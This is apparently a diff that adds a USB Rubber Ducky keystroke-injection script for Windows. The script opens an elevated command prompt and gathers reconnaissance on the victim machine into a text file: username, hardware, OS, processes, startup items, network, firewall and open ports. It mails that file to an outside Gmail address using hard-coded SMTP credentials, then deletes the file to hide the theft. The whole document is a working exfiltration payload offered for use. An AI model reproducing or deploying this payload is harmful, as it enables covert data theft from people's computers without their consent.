@@ -1,0 +1,118 @@
+DELAY 1
+WINDOWS D
+DELAY 200
+WINDOWS R
+DELAY 200
+STRING powershell Start-Process cmd.exe -Verb runAs
+ENTER
+DELAY 1500
+ALT Y
+DELAY 50
+ENTER
+DELAY 1000
+STRING cd C:\
+ENTER
+STRING echo Username of targeted PC: > info.txt
+ENTER
+STRING whoami >> info.txt
+ENTER
+DELAY 1
+STRING echo Information about the users monitor (resolution): >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" desktopmonitor list brief >> nul
+ENTER
+DELAY 1
+STRING echo Operating system information: >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" os list brief >> nul
+ENTER
+DELAY 1
+STRING echo BIOS information: >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" bios list brief >> nul
+ENTER
+DELAY 1
+STRING echo CPU Information: >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" cpu get name,CurrentClockSpeed,MaxClockSpeed, NumberOfCores, NumberOfLogicalProcessors >> nul
+ENTER
+DELAY 1
+STRING echo Video Card Information: >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" path win32_VideoController get name >> nul
+ENTER
+DELAY 1
+STRING echo RAM Memory Information: >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" memorychip list brief >> nul
+ENTER
+DELAY 1
+STRING echo HDD Information: >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" diskdrive list brief >> nul
+ENTER
+DELAY 1
+STRING echo HDD Local storage partition information: >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" logicaldisk list brief >> nul
+ENTER
+DELAY 1
+STRING echo List of running processes: >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" process list brief >> nul
+ENTER
+DELAY 1
+STRING echo List of programs that start at startup: >> info.txt
+ENTER
+STRING wmic /APPEND:"C:\info.txt" startup list brief >> nul
+ENTER
+DELAY 1
+STRING echo IP Information: >> info.txt
+ENTER
+STRING ipconfig /all >> info.txt
+ENTER
+DELAY 1
+STRING echo Firewall Information: >> info.txt
+ENTER
+STRING netsh advfirewall show allprofiles >> info.txt
+ENTER
+DELAY 1
+STRING echo Open ports information: >> info.txt
+ENTER
+STRING netstat -an >> info.txt
+ENTER
+DELAY 10
+STRING powershell
+DELAY 10
+ENTER
+DELAY 10
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ethhackingcov@gmail.com', 'Unicorn123');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'ethhackingcov@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('ethhackcov@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'Results for the target computer'
+ENTER
+STRING $ReportEmail.Body = 'Here is the data...'
+ENTER
+STRING $ReportEmail.Attachments.Add('C:\info.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 1500
+STRING exit
+ENTER
+DELAY 5
+STRING del C:\info.txt
+ENTER
+STRING exit
+ENTER
